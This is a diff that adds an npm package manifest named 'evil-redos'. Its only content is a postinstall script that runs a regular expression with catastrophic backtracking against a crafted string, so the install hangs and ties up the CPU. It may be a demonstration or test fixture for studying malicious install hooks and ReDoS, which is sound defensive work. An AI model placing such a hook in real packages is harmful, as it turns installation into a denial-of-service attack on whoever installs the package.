@@ -1,0 +1,7 @@
+{
+  "name": "evil-redos",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e '/(a+)+b/.test(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\")'"
+  }
+}
